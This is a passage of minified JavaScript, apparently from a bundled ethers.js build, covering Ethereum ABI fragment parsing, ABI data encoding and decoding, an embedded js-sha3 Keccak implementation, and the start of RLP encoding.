l=i(o.parent);o.parent.components.push(l),delete o.parent,o=l;break;case" ":o.state.allowType&&o.type!==""&&(o.type=Za(o.type),delete o.state.allowType,o.state.allowName=!0,o.state.allowParams=!0),o.state.allowName&&o.name!==""&&(o.name==="indexed"?(e||n(a),o.indexed&&n(a),o.indexed=!0,o.name=""):Jh(o.type,o.name)?o.name="":o.state.allowName=!1);break;case"[":o.state.allowArray||n(a),o.type+=c,o.state.allowArray=!1,o.state.allowName=!1,o.state.readArray=!0;break;case"]":o.state.readArray||n(a),o.type+=c,o.state.readArray=!1,o.state.allowArray=!0,o.state.allowName=!0;break;default:o.state.allowType?(o.type+=c,o.state.allowParams=!0,o.state.allowArray=!0):o.state.allowName?(o.name+=c,delete o.state.allowArray):o.state.readArray?o.type+=c:n(a)}}return o.parent&&je.throwArgumentError("unexpected eof","param",t),delete s.state,o.name==="indexed"?(e||n(r.length-7),o.indexed&&n(r.length-7),o.indexed=!0,o.name=""):Jh(o.type,o.name)&&(o.name=""),s.type=Za(s.type),s}function vd(t,e){for(let r in e)X(t,r,e[r])}const Ke=Object.freeze({sighash:"sighash",minimal:"minimal",full:"full",json:"json"}),yV=new RegExp(/^(.*)\[([0-9]*)\]$/);class br{constructor(e,r){e!==pa&&je.throwError("use fromString",H.errors.UNSUPPORTED_OPERATION,{operation:"new ParamType()"}),vd(this,r);let n=this.type.match(yV);n?vd(this,{arrayLength:parseInt(n[2]||"-1"),arrayChildren:br.fromObject({type:n[1],components:this.components}),baseType:"array"}):vd(this,{arrayLength:null,arrayChildren:null,baseType:this.components!=null?"tuple":this.type}),this._isParamType=!0,Object.freeze(this)}format(e){if(e||(e=Ke.sighash),Ke[e]||je.throwArgumentError("invalid format type","format",e),e===Ke.json){let n={type:this.baseType==="tuple"?"tuple":this.type,name:this.name||void 0};return typeof this.indexed=="boolean"&&(n.indexed=this.indexed),this.components&&(n.components=this.components.map(i=>JSON.parse(i.format(e)))),JSON.stringify(n)}let r="";return this.baseType==="array"?(r+=this.arrayChildren.format(e),r+="["+(this.arrayLength<0?"":String(this.arrayLength))+"]"):this.baseType==="tuple"?(e!==Ke.sighash&&(r+=this.type),r+="("+this.components.map(n=>n.format(e)).join(e===Ke.full?", ":",")+")"):r+=this.type,e!==Ke.sighash&&(this.indexed===!0&&(r+=" indexed"),e===Ke.full&&this.name&&(r+=" "+this.name)),r}static from(e,r){return typeof e=="string"?br.fromString(e,r):br.fromObject(e)}static fromObject(e){return br.isParamType(e)?e:new br(pa,{name:e.name||null,type:Za(e.type),indexed:e.indexed==null?null:!!e.indexed,components:e.components?e.components.map(br.fromObject):null})}static fromString(e,r){function n(i){return br.fromObject({name:i.name,type:i.type,indexed:i.indexed,components:i.components})}return n(mV(e,!!r))}static isParamType(e){return!!(e!=null&&e._isParamType)}}function Ll(t,e){return bV(t).map(r=>br.fromString(r,e))}class ds{constructor(e,r){e!==pa&&je.throwError("use a static from method",H.errors.UNSUPPORTED_OPERATION,{operation:"new Fragment()"}),vd(this,r),this._isFragment=!0,Object.freeze(this)}static from(e){return ds.isFragment(e)?e:typeof e=="string"?ds.fromString(e):ds.fromObject(e)}static fromObject(e){if(ds.isFragment(e))return e;switch(e.type){case"function":return Mi.fromObject(e);case"event":return ls.fromObject(e);case"constructor":return Di.fromObject(e);case"error":return Gs.fromObject(e);case"fallback":case"receive":return null}return je.throwArgumentError("invalid fragment object","value",e)}static fromString(e){return e=e.replace(/\s/g," "),e=e.replace(/\(/g," (").replace(/\)/g,") ").replace(/\s+/g," "),e=e.trim(),e.split(" ")[0]==="event"?ls.fromString(e.substring(5).trim()):e.split(" ")[0]==="function"?Mi.fromString(e.substring(8).trim()):e.split("(")[0].trim()==="constructor"?Di.fromString(e.trim()):e.split(" ")[0]==="error"?Gs.fromString(e.substring(5).trim()):je.throwArgumentError("unsupported fragment","value",e)}static isFragment(e){return!!(e&&e._isFragment)}}class ls extends ds{format(e){if(e||(e=Ke.sighash),Ke[e]||je.throwArgumentError("invalid format type","format",e),e===Ke.json)return JSON.stringify({type:"event",anonymous:this.anonymous,name:this.name,inputs:this.inputs.map(n=>JSON.parse(n.format(e)))});let r="";return e!==Ke.sighash&&(r+="event "),r+=this.name+"("+this.inputs.map(n=>n.format(e)).join(e===Ke.full?", ":",")+") ",e!==Ke.sighash&&this.anonymous&&(r+="anonymous "),r.trim()}static from(e){return typeof e=="string"?ls.fromString(e):ls.fromObject(e)}static fromObject(e){if(ls.isEventFragment(e))return e;e.type!=="event"&&je.throwArgumentError("invalid event object","value",e);const r={name:Fl(e.name),anonymous:e.anonymous,inputs:e.inputs?e.inputs.map(br.fromObject):[],type:"event"};return new ls(pa,r)}static fromString(e){let r=e.match(jl);r||je.throwArgumentError("invalid event string","value",e);let n=!1;return r[3].split(" ").forEach(i=>{switch(i.trim()){case"anonymous":n=!0;break;case"":break;default:je.warn("unknown modifier: "+i)}}),ls.fromObject({name:r[1].trim(),anonymous:n,inputs:Ll(r[2],!0),type:"event"})}static isEventFragment(e){return e&&e._isFragment&&e.type==="event"}}function yx(t,e){e.gas=null;let r=t.split("@");return r.length!==1?(r.length>2&&je.throwArgumentError("invalid human-readable ABI signature","value",t),r[1].match(/^[0-9]+$/)||je.throwArgumentError("invalid human-readable ABI signature gas","value",t),e.gas=ne.from(r[1]),r[0]):t}function wx(t,e){e.constant=!1,e.payable=!1,e.stateMutability="nonpayable",t.split(" ").forEach(r=>{switch(r.trim()){case"constant":e.constant=!0;break;case"payable":e.payable=!0,e.stateMutability="payable";break;case"nonpayable":e.payable=!1,e.stateMutability="nonpayable";break;case"pure":e.constant=!0,e.stateMutability="pure";break;case"view":e.constant=!0,e.stateMutability="view";break;case"external":case"public":case"":break;default:console.log("unknown modifier: "+r)}})}function bx(t){let e={constant:!1,payable:!0,stateMutability:"payable"};return t.stateMutability!=null?(e.stateMutability=t.stateMutability,e.constant=e.stateMutability==="view"||e.stateMutability==="pure",t.constant!=null&&!!t.constant!==e.constant&&je.throwArgumentError("cannot have constant function with mutability "+e.stateMutability,"value",t),e.payable=e.stateMutability==="payable",t.payable!=null&&!!t.payable!==e.payable&&je.throwArgumentError("cannot have payable function with mutability "+e.stateMutability,"value",t)):t.payable!=null?(e.payable=!!t.payable,t.constant==null&&!e.payable&&t.type!=="constructor"&&je.throwArgumentError("unable to determine stateMutability","value",t),e.constant=!!t.constant,e.constant?e.stateMutability="view":e.stateMutability=e.payable?"payable":"nonpayable",e.payable&&e.constant&&je.throwArgumentError("cannot have constant payable function","value",t)):t.constant!=null?(e.constant=!!t.constant,e.payable=!e.constant,e.stateMutability=e.constant?"view":"payable"):t.type!=="constructor"&&je.throwArgumentError("unable to determine stateMutability","value",t),e}class Di extends ds{format(e){if(e||(e=Ke.sighash),Ke[e]||je.throwArgumentError("invalid format type","format",e),e===Ke.json)return JSON.stringify({type:"constructor",stateMutability:this.stateMutability!=="nonpayable"?this.stateMutability:void 0,payable:this.payable,gas:this.gas?this.gas.toNumber():void 0,inputs:this.inputs.map(n=>JSON.parse(n.format(e)))});e===Ke.sighash&&je.throwError("cannot format a constructor for sighash",H.errors.UNSUPPORTED_OPERATION,{operation:"format(sighash)"});let r="constructor("+this.inputs.map(n=>n.format(e)).join(e===Ke.full?", ":",")+") ";return this.stateMutability&&this.stateMutability!=="nonpayable"&&(r+=this.stateMutability+" "),r.trim()}static from(e){return typeof e=="string"?Di.fromString(e):Di.fromObject(e)}static fromObject(e){if(Di.isConstructorFragment(e))return e;e.type!=="constructor"&&je.throwArgumentError("invalid constructor object","value",e);let r=bx(e);r.constant&&je.throwArgumentError("constructor cannot be constant","value",e);const n={name:null,type:e.type,inputs:e.inputs?e.inputs.map(br.fromObject):[],payable:r.payable,stateMutability:r.stateMutability,gas:e.gas?ne.from(e.gas):null};return new Di(pa,n)}static fromString(e){let r={type:"constructor"};e=yx(e,r);let n=e.match(jl);return(!n||n[1].trim()!=="constructor")&&je.throwArgumentError("invalid constructor string","value",e),r.inputs=Ll(n[2].trim(),!1),wx(n[3].trim(),r),Di.fromObject(r)}static isConstructorFragment(e){return e&&e._isFragment&&e.type==="constructor"}}class Mi extends Di{format(e){if(e||(e=Ke.sighash),Ke[e]||je.throwArgumentError("invalid format type","format",e),e===Ke.json)return JSON.stringify({type:"function",name:this.name,constant:this.constant,stateMutability:this.stateMutability!=="nonpayable"?this.stateMutability:void 0,payable:this.payable,gas:this.gas?this.gas.toNumber():void 0,inputs:this.inputs.map(n=>JSON.parse(n.format(e))),outputs:this.outputs.map(n=>JSON.parse(n.format(e)))});let r="";return e!==Ke.sighash&&(r+="function "),r+=this.name+"("+this.inputs.map(n=>n.format(e)).join(e===Ke.full?", ":",")+") ",e!==Ke.sighash&&(this.stateMutability?this.stateMutability!=="nonpayable"&&(r+=this.stateMutability+" "):this.constant&&(r+="view "),this.outputs&&this.outputs.length&&(r+="returns ("+this.outputs.map(n=>n.format(e)).join(", ")+") "),this.gas!=null&&(r+="@"+this.gas.toString()+" ")),r.trim()}static from(e){return typeof e=="string"?Mi.fromString(e):Mi.fromObject(e)}static fromObject(e){if(Mi.isFunctionFragment(e))return e;e.type!=="function"&&je.throwArgumentError("invalid function object","value",e);let r=bx(e);const n={type:e.type,name:Fl(e.name),constant:r.constant,inputs:e.inputs?e.inputs.map(br.fromObject):[],outputs:e.outputs?e.outputs.map(br.fromObject):[],payable:r.payable,stateMutability:r.stateMutability,gas:e.gas?ne.from(e.gas):null};return new Mi(pa,n)}static fromString(e){let r={type:"function"};e=yx(e,r);let n=e.split(" returns ");n.length>2&&je.throwArgumentError("invalid function string","value",e);let i=n[0].match(jl);if(i||je.throwArgumentError("invalid function signature","value",e),r.name=i[1].trim(),r.name&&Fl(r.name),r.inputs=Ll(i[2],!1),wx(i[3].trim(),r),n.length>1){let s=n[1].match(jl);(s[1].trim()!=""||s[3].trim()!="")&&je.throwArgumentError("unexpected tokens","value",e),r.outputs=Ll(s[2],!1)}else r.outputs=[];return Mi.fromObject(r)}static isFunctionFragment(e){return e&&e._isFragment&&e.type==="function"}}function SA(t){const e=t.format();return(e==="Error(string)"||e==="Panic(uint256)")&&je.throwArgumentError(`cannot specify user defined ${e} error`,"fragment",t),t}class Gs extends ds{format(e){if(e||(e=Ke.sighash),Ke[e]||je.throwArgumentError("invalid format type","format",e),e===Ke.json)return JSON.stringify({type:"error",name:this.name,inputs:this.inputs.map(n=>JSON.parse(n.format(e)))});let r="";return e!==Ke.sighash&&(r+="error "),r+=this.name+"("+this.inputs.map(n=>n.format(e)).join(e===Ke.full?", ":",")+") ",r.trim()}static from(e){return typeof e=="string"?Gs.fromString(e):Gs.fromObject(e)}static fromObject(e){if(Gs.isErrorFragment(e))return e;e.type!=="error"&&je.throwArgumentError("invalid error object","value",e);const r={type:e.type,name:Fl(e.name),inputs:e.inputs?e.inputs.map(br.fromObject):[]};return SA(new Gs(pa,r))}static fromString(e){let r={type:"error"},n=e.match(jl);return n||je.throwArgumentError("invalid error signature","value",e),r.name=n[1].trim(),r.name&&Fl(r.name),r.inputs=Ll(n[2],!1),SA(Gs.fromObject(r))}static isErrorFragment(e){return e&&e._isFragment&&e.type==="error"}}function Za(t){return t.match(/^uint($|[^1-9])/)?t="uint256"+t.substring(4):t.match(/^int($|[^1-9])/)&&(t="int256"+t.substring(3)),t}const wV=new RegExp("^[a-zA-Z$_][a-zA-Z0-9$_]*$");function Fl(t){return(!t||!t.match(wV))&&je.throwArgumentError(`invalid identifier "${t}"`,"value",t),t}const jl=new RegExp("^([^)(]*)\\((.*)\\)([^)(]*)$");function bV(t){t=t.trim();let e=[],r="",n=0;for(let i=0;i<t.length;i++){let s=t[i];s===","&&n===0?(e.push(r),r=""):(r+=s,s==="("?n++:s===")"&&(n--,n===-1&&je.throwArgumentError("unbalanced parenthesis","value",t)))}return r&&e.push(r),e}const Qy=new H(yh);function vV(t){const e=[],r=function(n,i){if(Array.isArray(i))for(let s in i){const o=n.slice();o.push(s);try{r(o,i[s])}catch(a){e.push({path:o,error:a})}}};return r([],t),e}class _s{constructor(e,r,n,i){this.name=e,this.type=r,this.localName=n,this.dynamic=i}_throwError(e,r){Qy.throwArgumentError(e,this.localName,r)}}class B0{constructor(e){X(this,"wordSize",e||32),this._data=[],this._dataLength=0,this._padding=new Uint8Array(e)}get data(){return dn(this._data)}get length(){return this._dataLength}_writeData(e){return this._data.push(e),this._dataLength+=e.length,e.length}appendWriter(e){return this._writeData(Pn(e._data))}writeBytes(e){let r=ve(e);const n=r.length%this.wordSize;return n&&(r=Pn([r,this._padding.slice(n)])),this._writeData(r)}_getValue(e){let r=ve(ne.from(e));return r.length>this.wordSize&&Qy.throwError("value out-of-bounds",H.errors.BUFFER_OVERRUN,{length:this.wordSize,offset:r.length}),r.length%this.wordSize&&(r=Pn([this._padding.slice(r.length%this.wordSize),r])),r}writeValue(e){return this._writeData(this._getValue(e))}writeUpdatableValue(){const e=this._data.length;return this._data.push(this._padding),this._dataLength+=this.wordSize,r=>{this._data[e]=this._getValue(r)}}}class df{constructor(e,r,n,i){X(this,"_data",ve(e)),X(this,"wordSize",r||32),X(this,"_coerceFunc",n),X(this,"allowLoose",i),this._offset=0}get data(){return we(this._data)}get consumed(){return this._offset}static coerce(e,r){let n=e.match("^u?int([0-9]+)$");return n&&parseInt(n[1])<=48&&(r=r.toNumber()),r}coerce(e,r){return this._coerceFunc?this._coerceFunc(e,r):df.coerce(e,r)}_peekBytes(e,r,n){let i=Math.ceil(r/this.wordSize)*this.wordSize;return this._offset+i>this._data.length&&(this.allowLoose&&n&&this._offset+r<=this._data.length?i=r:Qy.throwError("data out-of-bounds",H.errors.BUFFER_OVERRUN,{length:this._data.length,offset:this._offset+i})),this._data.slice(this._offset,this._offset+i)}subReader(e){return new df(this._data.slice(this._offset+e),this.wordSize,this._coerceFunc,this.allowLoose)}readBytes(e,r){let n=this._peekBytes(0,e,!!r);return this._offset+=n.length,n.slice(0,e)}readValue(){return ne.from(this.readBytes(this.wordSize))}}var Wg={exports:{}};/**
 * [js-sha3]{@link https://github.com/emn178/js-sha3}
 *
 * @version 0.8.0
 * @author Chen, Yi-Cyuan [emn178@gmail.com]
 * @copyright Chen, Yi-Cyuan 2015-2018
 * @license MIT
 */var NA;function EV(){return NA||(NA=1,function(t){(function(){var e="input is invalid type",r="finalize already called",n=typeof window=="object",i=n?window:{};i.JS_SHA3_NO_WINDOW&&(n=!1);var s=!n&&typeof self=="object",o=!i.JS_SHA3_NO_NODE_JS&&typeof process=="object"&&process.versions&&process.versions.node;o?i=ci:s&&(i=self);var a=!i.JS_SHA3_NO_COMMON_JS&&!0&&t.exports,c=!i.JS_SHA3_NO_ARRAY_BUFFER&&typeof ArrayBuffer<"u",u="0123456789abcdef".split(""),l=[31,7936,2031616,520093696],h=[4,1024,262144,67108864],d=[1,256,65536,16777216],g=[6,1536,393216,100663296],y=[0,8,16,24],m=[1,0,32898,0,32906,2147483648,2147516416,2147483648,32907,0,2147483649,0,2147516545,2147483648,32777,2147483648,138,0,136,0,2147516425,0,2147483658,0,2147516555,0,139,2147483648,32905,2147483648,32771,2147483648,32770,2147483648,128,2147483648,32778,0,2147483658,2147483648,2147516545,2147483648,32896,2147483648,2147483649,0,2147516424,2147483648],b=[224,256,384,512],A=[128,256],_=["hex","buffer","arrayBuffer","array","digest"],T={128:168,256:136};(i.JS_SHA3_NO_NODE_JS||!Array.isArray)&&(Array.isArray=function(I){return Object.prototype.toString.call(I)==="[object Array]"}),c&&(i.JS_SHA3_NO_ARRAY_BUFFER_IS_VIEW||!ArrayBuffer.isView)&&(ArrayBuffer.isView=function(I){return typeof I=="object"&&I.buffer&&I.buffer.constructor===ArrayBuffer});for(var P=function(I,z,G){return function(W){return new v(I,z,I).update(W)[G]()}},S=function(I,z,G){return function(W,K){return new v(I,z,K).update(W)[G]()}},C=function(I,z,G){return function(W,K,ae,ee){return f["cshake"+I].update(W,K,ae,ee)[G]()}},O=function(I,z,G){return function(W,K,ae,ee){return f["kmac"+I].update(W,K,ae,ee)[G]()}},$=function(I,z,G,W){for(var K=0;K<_.length;++K){var ae=_[K];I[ae]=z(G,W,ae)}return I},D=function(I,z){var G=P(I,z,"hex");return G.create=function(){return new v(I,z,I)},G.update=function(W){return G.create().update(W)},$(G,P,I,z)},F=function(I,z){var G=S(I,z,"hex");return G.create=function(W){return new v(I,z,W)},G.update=function(W,K){return G.create(K).update(W)},$(G,S,I,z)},j=function(I,z){var G=T[I],W=C(I,z,"hex");return W.create=function(K,ae,ee){return!ae&&!ee?f["shake"+I].create(K):new v(I,z,K).bytepad([ae,ee],G)},W.update=function(K,ae,ee,J){return W.create(ae,ee,J).update(K)},$(W,C,I,z)},L=function(I,z){var G=T[I],W=O(I,z,"hex");return W.create=function(K,ae,ee){return new M(I,z,ae).bytepad(["KMAC",ee],G).bytepad([K],G)},W.update=function(K,ae,ee,J){return W.create(K,ee,J).update(ae)},$(W,O,I,z)},N=[{name:"keccak",padding:d,bits:b,createMethod:D},{name:"sha3",padding:g,bits:b,createMethod:D},{name:"shake",padding:l,bits:A,createMethod:F},{name:"cshake",padding:h,bits:A,createMethod:j},{name:"kmac",padding:h,bits:A,createMethod:L}],f={},p=[],w=0;w<N.length;++w)for(var E=N[w],x=E.bits,R=0;R<x.length;++R){var B=E.name+"_"+x[R];if(p.push(B),f[B]=E.createMethod(x[R],E.padding),E.name!=="sha3"){var k=E.name+x[R];p.push(k),f[k]=f[B]}}function v(I,z,G){this.blocks=[],this.s=[],this.padding=z,this.outputBits=G,this.reset=!0,this.finalized=!1,this.block=0,this.start=0,this.blockCount=1600-(I<<1)>>5,this.byteCount=this.blockCount<<2,this.outputBlocks=G>>5,this.extraBytes=(G&31)>>3;for(var W=0;W<50;++W)this.s[W]=0}v.prototype.update=function(I){if(this.finalized)throw new Error(r);var z,G=typeof I;if(G!=="string"){if(G==="object"){if(I===null)throw new Error(e);if(c&&I.constructor===ArrayBuffer)I=new Uint8Array(I);else if(!Array.isArray(I)&&(!c||!ArrayBuffer.isView(I)))throw new Error(e)}else throw new Error(e);z=!0}for(var W=this.blocks,K=this.byteCount,ae=I.length,ee=this.blockCount,J=0,Te=this.s,ie,ye;J<ae;){if(this.reset)for(this.reset=!1,W[0]=this.block,ie=1;ie<ee+1;++ie)W[ie]=0;if(z)for(ie=this.start;J<ae&&ie<K;++J)W[ie>>2]|=I[J]<<y[ie++&3];else for(ie=this.start;J<ae&&ie<K;++J)ye=I.charCodeAt(J),ye<128?W[ie>>2]|=ye<<y[ie++&3]:ye<2048?(W[ie>>2]|=(192|ye>>6)<<y[ie++&3],W[ie>>2]|=(128|ye&63)<<y[ie++&3]):ye<55296||ye>=57344?(W[ie>>2]|=(224|ye>>12)<<y[ie++&3],W[ie>>2]|=(128|ye>>6&63)<<y[ie++&3],W[ie>>2]|=(128|ye&63)<<y[ie++&3]):(ye=65536+((ye&1023)<<10|I.charCodeAt(++J)&1023),W[ie>>2]|=(240|ye>>18)<<y[ie++&3],W[ie>>2]|=(128|ye>>12&63)<<y[ie++&3],W[ie>>2]|=(128|ye>>6&63)<<y[ie++&3],W[ie>>2]|=(128|ye&63)<<y[ie++&3]);if(this.lastByteIndex=ie,ie>=K){for(this.start=ie-K,this.block=W[ee],ie=0;ie<ee;++ie)Te[ie]^=W[ie];V(Te),this.reset=!0}else this.start=ie}return this},v.prototype.encode=function(I,z){var G=I&255,W=1,K=[G];for(I=I>>8,G=I&255;G>0;)K.unshift(G),I=I>>8,G=I&255,++W;return z?K.push(W):K.unshift(W),this.update(K),K.length},v.prototype.encodeString=function(I){var z,G=typeof I;if(G!=="string"){if(G==="object"){if(I===null)throw new Error(e);if(c&&I.constructor===ArrayBuffer)I=new Uint8Array(I);else if(!Array.isArray(I)&&(!c||!ArrayBuffer.isView(I)))throw new Error(e)}else throw new Error(e);z=!0}var W=0,K=I.length;if(z)W=K;else for(var ae=0;ae<I.length;++ae){var ee=I.charCodeAt(ae);ee<128?W+=1:ee<2048?W+=2:ee<55296||ee>=57344?W+=3:(ee=65536+((ee&1023)<<10|I.charCodeAt(++ae)&1023),W+=4)}return W+=this.encode(W*8),this.update(I),W},v.prototype.bytepad=function(I,z){for(var G=this.encode(z),W=0;W<I.length;++W)G+=this.encodeString(I[W]);var K=z-G%z,ae=[];return ae.length=K,this.update(ae),this},v.prototype.finalize=function(){if(!this.finalized){this.finalized=!0;var I=this.blocks,z=this.lastByteIndex,G=this.blockCount,W=this.s;if(I[z>>2]|=this.padding[z&3],this.lastByteIndex===this.byteCount)for(I[0]=I[G],z=1;z<G+1;++z)I[z]=0;for(I[G-1]|=2147483648,z=0;z<G;++z)W[z]^=I[z];V(W)}},v.prototype.toString=v.prototype.hex=function(){this.finalize();for(var I=this.blockCount,z=this.s,G=this.outputBlocks,W=this.extraBytes,K=0,ae=0,ee="",J;ae<G;){for(K=0;K<I&&ae<G;++K,++ae)J=z[K],ee+=u[J>>4&15]+u[J&15]+u[J>>12&15]+u[J>>8&15]+u[J>>20&15]+u[J>>16&15]+u[J>>28&15]+u[J>>24&15];ae%I===0&&(V(z),K=0)}return W&&(J=z[K],ee+=u[J>>4&15]+u[J&15],W>1&&(ee+=u[J>>12&15]+u[J>>8&15]),W>2&&(ee+=u[J>>20&15]+u[J>>16&15])),ee},v.prototype.arrayBuffer=function(){this.finalize();var I=this.blockCount,z=this.s,G=this.outputBlocks,W=this.extraBytes,K=0,ae=0,ee=this.outputBits>>3,J;W?J=new ArrayBuffer(G+1<<2):J=new ArrayBuffer(ee);for(var Te=new Uint32Array(J);ae<G;){for(K=0;K<I&&ae<G;++K,++ae)Te[ae]=z[K];ae%I===0&&V(z)}return W&&(Te[K]=z[K],J=J.slice(0,ee)),J},v.prototype.buffer=v.prototype.arrayBuffer,v.prototype.digest=v.prototype.array=function(){this.finalize();for(var I=this.blockCount,z=this.s,G=this.outputBlocks,W=this.extraBytes,K=0,ae=0,ee=[],J,Te;ae<G;){for(K=0;K<I&&ae<G;++K,++ae)J=ae<<2,Te=z[K],ee[J]=Te&255,ee[J+1]=Te>>8&255,ee[J+2]=Te>>16&255,ee[J+3]=Te>>24&255;ae%I===0&&V(z)}return W&&(J=ae<<2,Te=z[K],ee[J]=Te&255,W>1&&(ee[J+1]=Te>>8&255),W>2&&(ee[J+2]=Te>>16&255)),ee};function M(I,z,G){v.call(this,I,z,G)}M.prototype=new v,M.prototype.finalize=function(){return this.encode(this.outputBits,!0),v.prototype.finalize.call(this)};var V=function(I){var z,G,W,K,ae,ee,J,Te,ie,ye,Vr,ze,tt,yn,Ze,We,wn,Xe,He,Kr,et,rt,Qi,ft,pt,ho,_t,Ct,fo,It,xt,po,St,Nt,go,Tt,Pt,mo,Rt,Ot,yo,kt,Dt,wo,Mt,Bt,bo,Ut,$t,vo,Lt,Ft,Eo,jt,qt,Ao,zt,Ht,Is,xs,Ss,Ns,Ts;for(W=0;W<48;W+=2)K=I[0]^I[10]^I[20]^I[30]^I[40],ae=I[1]^I[11]^I[21]^I[31]^I[41],ee=I[2]^I[12]^I[22]^I[32]^I[42],J=I[3]^I[13]^I[23]^I[33]^I[43],Te=I[4]^I[14]^I[24]^I[34]^I[44],ie=I[5]^I[15]^I[25]^I[35]^I[45],ye=I[6]^I[16]^I[26]^I[36]^I[46],Vr=I[7]^I[17]^I[27]^I[37]^I[47],ze=I[8]^I[18]^I[28]^I[38]^I[48],tt=I[9]^I[19]^I[29]^I[39]^I[49],z=ze^(ee<<1|J>>>31),G=tt^(J<<1|ee>>>31),I[0]^=z,I[1]^=G,I[10]^=z,I[11]^=G,I[20]^=z,I[21]^=G,I[30]^=z,I[31]^=G,I[40]^=z,I[41]^=G,z=K^(Te<<1|ie>>>31),G=ae^(ie<<1|Te>>>31),I[2]^=z,I[3]^=G,I[12]^=z,I[13]^=G,I[22]^=z,I[23]^=G,I[32]^=z,I[33]^=G,I[42]^=z,I[43]^=G,z=ee^(ye<<1|Vr>>>31),G=J^(Vr<<1|ye>>>31),I[4]^=z,I[5]^=G,I[14]^=z,I[15]^=G,I[24]^=z,I[25]^=G,I[34]^=z,I[35]^=G,I[44]^=z,I[45]^=G,z=Te^(ze<<1|tt>>>31),G=ie^(tt<<1|ze>>>31),I[6]^=z,I[7]^=G,I[16]^=z,I[17]^=G,I[26]^=z,I[27]^=G,I[36]^=z,I[37]^=G,I[46]^=z,I[47]^=G,z=ye^(K<<1|ae>>>31),G=Vr^(ae<<1|K>>>31),I[8]^=z,I[9]^=G,I[18]^=z,I[19]^=G,I[28]^=z,I[29]^=G,I[38]^=z,I[39]^=G,I[48]^=z,I[49]^=G,yn=I[0],Ze=I[1],Bt=I[11]<<4|I[10]>>>28,bo=I[10]<<4|I[11]>>>28,Ct=I[20]<<3|I[21]>>>29,fo=I[21]<<3|I[20]>>>29,xs=I[31]<<9|I[30]>>>23,Ss=I[30]<<9|I[31]>>>23,kt=I[40]<<18|I[41]>>>14,Dt=I[41]<<18|I[40]>>>14,Nt=I[2]<<1|I[3]>>>31,go=I[3]<<1|I[2]>>>31,We=I[13]<<12|I[12]>>>20,wn=I[12]<<12|I[13]>>>20,Ut=I[22]<<10|I[23]>>>22,$t=I[23]<<10|I[22]>>>22,It=I[33]<<13|I[32]>>>19,xt=I[32]<<13|I[33]>>>19,Ns=I[42]<<2|I[43]>>>30,Ts=I[43]<<2|I[42]>>>30,jt=I[5]<<30|I[4]>>>2,qt=I[4]<<30|I[5]>>>2,Tt=I[14]<<6|I[15]>>>26,Pt=I[15]<<6|I[14]>>>26,Xe=I[25]<<11|I[24]>>>21,He=I[24]<<11|I[25]>>>21,vo=I[34]<<15|I[35]>>>17,Lt=I[35]<<15|I[34]>>>17,po=I[45]<<29|I[44]>>>3,St=I[44]<<29|I[45]>>>3,ft=I[6]<<28|I[7]>>>4,pt=I[7]<<28|I[6]>>>4,Ao=I[17]<<23|I[16]>>>9,zt=I[16]<<23|I[17]>>>9,mo=I[26]<<25|I[27]>>>7,Rt=I[27]<<25|I[26]>>>7,Kr=I[36]<<21|I[37]>>>11,et=I[37]<<21|I[36]>>>11,Ft=I[47]<<24|I[46]>>>8,Eo=I[46]<<24|I[47]>>>8,wo=I[8]<<27|I[9]>>>5,Mt=I[9]<<27|I[8]>>>5,ho=I[18]<<20|I[19]>>>12,_t=I[19]<<20|I[18]>>>12,Ht=I[29]<<7|I[28]>>>25,Is=I[28]<<7|I[29]>>>25,Ot=I[38]<<8|I[39]>>>24,yo=I[39]<<8|I[38]>>>24,rt=I[48]<<14|I[49]>>>18,Qi=I[49]<<14|I[48]>>>18,I[0]=yn^~We&Xe,I[1]=Ze^~wn&He,I[10]=ft^~ho&Ct,I[11]=pt^~_t&fo,I[20]=Nt^~Tt&mo,I[21]=go^~Pt&Rt,I[30]=wo^~Bt&Ut,I[31]=Mt^~bo&$t,I[40]=jt^~Ao&Ht,I[41]=qt^~zt&Is,I[2]=We^~Xe&Kr,I[3]=wn^~He&et,I[12]=ho^~Ct&It,I[13]=_t^~fo&xt,I[22]=Tt^~mo&Ot,I[23]=Pt^~Rt&yo,I[32]=Bt^~Ut&vo,I[33]=bo^~$t&Lt,I[42]=Ao^~Ht&xs,I[43]=zt^~Is&Ss,I[4]=Xe^~Kr&rt,I[5]=He^~et&Qi,I[14]=Ct^~It&po,I[15]=fo^~xt&St,I[24]=mo^~Ot&kt,I[25]=Rt^~yo&Dt,I[34]=Ut^~vo&Ft,I[35]=$t^~Lt&Eo,I[44]=Ht^~xs&Ns,I[45]=Is^~Ss&Ts,I[6]=Kr^~rt&yn,I[7]=et^~Qi&Ze,I[16]=It^~po&ft,I[17]=xt^~St&pt,I[26]=Ot^~kt&Nt,I[27]=yo^~Dt&go,I[36]=vo^~Ft&wo,I[37]=Lt^~Eo&Mt,I[46]=xs^~Ns&jt,I[47]=Ss^~Ts&qt,I[8]=rt^~yn&We,I[9]=Qi^~Ze&wn,I[18]=po^~ft&ho,I[19]=St^~pt&_t,I[28]=kt^~Nt&Tt,I[29]=Dt^~go&Pt,I[38]=Ft^~wo&Bt,I[39]=Eo^~Mt&bo,I[48]=Ns^~jt&Ao,I[49]=Ts^~qt&zt,I[0]^=m[W],I[1]^=m[W+1]};if(a)t.exports=f;else for(w=0;w<p.length;++w)i[p[w]]=f[p[w]]})()}(Wg)),Wg.exports}var AV=EV();const _V=co(AV);function fr(t){return"0x"+_V.keccak_256(ve(t))}const CV="rlp/5.8.0",Ri=new H(CV);function TA(t){const e=[];for(;t;)e.unshift(t&255),t>>=8;return e}function PA(t,e,r){let n=0;for(let i=0;i<r;i++)n=n*256+t[e+i];return n}function vx(t){if(Array.isArray(t)){let n=[];if(t.forEach(function(s){n=n.concat(vx(s))}),n.length<=55)return n.unshift(192+n.length),n;const i=TA(n.length);return i.unshift(247+i.length),i.concat(n)}Gy(t)||Ri.throwArgumentError("RLP object must be BytesLike","object",t);const e=Array.prototype.slice.call(ve(t));if(e.length===1&&e[0]<=127)return e;if(e.length<=55)return e.unshift(128+e.length),e;const r=TA(e.length);return r.unshift(183+r.length),r.concat(e)}function tp(t){return we(vx(t))}function RA(t,e,r,n){const i=[];for(;r<e+1+n;){const s=Ex(t,r);i.push(s.result),r+=s.consumed,r>e+1+n&&Ri.throwError("child data too short",H.errors.BUFFER_OVERRUN,{})}return{consumed:1+n,result:i}}function Ex(t,e){if(t.length===0&&Ri.throwError("data too short",H.errors.BUFFER_OVERRUN,{}),t[e]>=248){const r=t[e]-247;e+1+r>t.length&&Ri.throwError("data short segment too short",H.errors.BUFFER_OVERRUN,{});const n=PA(t,e+1,r);return e+1+r+n>t.length&&Ri.throwError("data long segment too short",H.errors.BUFFER_OVERRUN,{}),RA(t,e,e+1+r,r+n)}else 